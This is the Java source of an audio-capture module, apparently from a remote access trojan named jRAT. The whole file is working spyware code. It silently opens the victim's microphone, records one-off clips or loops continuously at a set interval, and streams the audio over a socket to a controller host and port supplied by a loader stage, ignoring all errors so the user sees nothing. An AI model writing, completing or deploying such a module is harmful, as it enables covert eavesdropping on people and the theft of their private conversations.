package jRAT.modules;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.util.Date;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantLock;

import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;

public class ModuleAudioCapture implements Runnable {

    private final static AtomicBoolean RECORDING            = new AtomicBoolean(false);
    private final static ReentrantLock SOCKET_LOCK          = new ReentrantLock();
    private static long RECORD_INTERVAL                     = 5*60*1000;

    private static String HOST                              = null;
    private static Integer PORT                             = null;

    private static Socket socket                            = null;
    private static DataInputStream socketInput              = null;
    private static DataOutputStream socketOutput            = null;

    /* AU format is used instead of WAVE because WAVE requires length to be written at
     * the beginning of the file and will fail with IOException when used on OutputStream
     * instead of File
     */
    private static AudioFileFormat.Type fileType            = AudioFileFormat.Type.AU;
    private static AudioFormat audioFormat                  = null;
    private static DataLine.Info dataLineInfo               = null;
    private static TargetDataLine targetDataLine            = null;
    private static ByteArrayOutputStream audioCaptureOutput = null;

    /* ---------------------------------------------------------------------------------------------------------- */

    private ModuleAudioCapture() {}
    
    /* ---------------------------------------------------------------------------------------------------------- */

    @Override
    public void run()
    {
        try { AudioSystem.write(new AudioInputStream(targetDataLine), fileType, audioCaptureOutput); }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void init(Class stage) throws Exception
    {
        HOST        = (String)  stage.getMethod("getHost", new Class[0]).invoke(null, new Object[0]);
        PORT        = (Integer) stage.getMethod("getPort", new Class[0]).invoke(null, new Object[0]);
        audioFormat = getAudioFormat();
    }
        
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: AudioCapture ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "capture",      "seconds"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "record",       ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "stop",         ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "status",       ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getinterval",  ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "setinterval",  "seconds"));
        return moduleInfo.toString().getBytes("UTF-8");
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        switch (methodName)
        {
            case "capture": return true;
            case "record":  return true;
            default:        return false;
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    private static void open()
    {
        try
        {
            if (socket == null)
            {
                socket       = new Socket(HOST, PORT);
                socketInput  = new DataInputStream(socket.getInputStream());
                socketOutput = new DataOutputStream(socket.getOutputStream());
                socketOutput.writeUTF("ModuleAudioCapture");
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void close()
    {
        try
        {
            if (socket != null)
            {
                socketOutput.writeUTF("CLOSE");
                socketInput.close();
                socketOutput.close();
                socket.close();
                socket = null;
            }
        }
        catch (Exception ex) {}
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] stop() throws UnsupportedEncodingException
    {
        RECORDING.set(false);
        try
        {
            targetDataLine.close();
            dataLineInfo = null;
            targetDataLine = null;
        }
        catch (Exception ex) {}     
        return new String("Stopped!").getBytes("UTF-8");
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
    
    public static byte[] status() throws UnsupportedEncodingException
    {
        if (RECORDING.get())
            return new String("Audio capture in progress!").getBytes("UTF-8");
        else
            return new String("No audio being captured!").getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */
 
    public static byte[] getinterval() throws UnsupportedEncodingException
    {
        StringBuilder response = new StringBuilder();
        response.append("Capture interval for continuous recording is: ");      
        response.append(String.valueOf((RECORD_INTERVAL/1000)));
        response.append(" seconds!");       
        return response.toString().getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] setinterval(String seconds) throws UnsupportedEncodingException
    {
        try
        {
            long tempMilliseconds = Long.parseLong(seconds)*1000;
            RECORD_INTERVAL = tempMilliseconds;
            return new String("Capture interval for continuous recording set to " + seconds + " seconds!").getBytes("UTF-8");
        }
        catch (NumberFormatException ex)
        {
            return new String("Could not set capture interval => Invalid number format!").getBytes("UTF-8");
        }
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
    
    private static AudioFormat getAudioFormat()
    {
        float sampleRate = 8000.0F;   // 8000, 11025, 16000, 22050, 44100
        int sampleSizeInBits = 16;    // 8, 16
        int channels = 1;             // 1, 2
        boolean signed = true;        // true, false
        boolean bigEndian = false;    // true, false

        return new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */
    /*                                      AUDIO CAPTURE METHODS                                               */
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */

    public static void capture(String lengthInSeconds)
    {
        if (RECORDING.get())
        {
            try
            {
                targetDataLine.close();
                dataLineInfo   = null;
                targetDataLine = null;
            }
            catch (Exception ex) {}
        }

        RECORDING.set(true);
        try
        {
            String filename = "capture_" + new Date().toString();
            
            long recordLength = Long.parseLong(lengthInSeconds) * 1000;
            if (recordLength < 1000)
                recordLength = RECORD_INTERVAL;

            dataLineInfo       = new DataLine.Info(TargetDataLine.class, audioFormat);
            targetDataLine     = (TargetDataLine)AudioSystem.getLine(dataLineInfo);
            audioCaptureOutput = new ByteArrayOutputStream();
            targetDataLine.open(audioFormat);
            targetDataLine.start();

            new Thread(new ModuleAudioCapture()).start();
            
            try { Thread.sleep(recordLength); }
            catch (InterruptedException ex) {}
            
            targetDataLine.close();

            byte[] audioBytes = audioCaptureOutput.toByteArray();
            
            SOCKET_LOCK.lock();
            
            if (socket == null) { open(); }

            socketOutput.writeUTF("OK");
            socketOutput.writeUTF(filename);
            socketOutput.writeLong(audioBytes.length);
            socketOutput.write(audioBytes);
        }
        catch (Exception ex) {}
        finally
        {
            close();
            RECORDING.set(false);
            SOCKET_LOCK.unlock();
        }
    }

    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */

    public static void record()
    {
        if (RECORDING.get())
        {
            try
            {
                targetDataLine.close();
                dataLineInfo   = null;
                targetDataLine = null;
            }
            catch (Exception ex) {}
        }

        RECORDING.set(true);
        try
        {
            while (RECORDING.get())
            {
                String filename = "record_" + new Date().toString();
                
                dataLineInfo       = new DataLine.Info(TargetDataLine.class, audioFormat);
                targetDataLine     = (TargetDataLine)AudioSystem.getLine(dataLineInfo);
                audioCaptureOutput = new ByteArrayOutputStream();
                targetDataLine.open(audioFormat);
                targetDataLine.start();
                
                new Thread(new ModuleAudioCapture()).start();

                try { Thread.sleep(RECORD_INTERVAL); }
                catch (InterruptedException ex) {}
                
                targetDataLine.close();

                byte[] audioBytes = audioCaptureOutput.toByteArray();
                
                long startTime = System.currentTimeMillis();
                
                SOCKET_LOCK.lock();
                if (socket == null) { open(); }
                socketOutput.writeUTF("OK");
                socketOutput.writeUTF(filename);
                socketOutput.writeLong(audioBytes.length);
                socketOutput.write(audioBytes);
                SOCKET_LOCK.unlock();
                
                long endTime = System.currentTimeMillis();
                System.out.println("TIME LOSS: " + (endTime - startTime));
            }
        }
        catch (Exception ex) {}
        finally
        {
            close();
            RECORDING.set(false);
            SOCKET_LOCK.unlock();
        }   
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
}
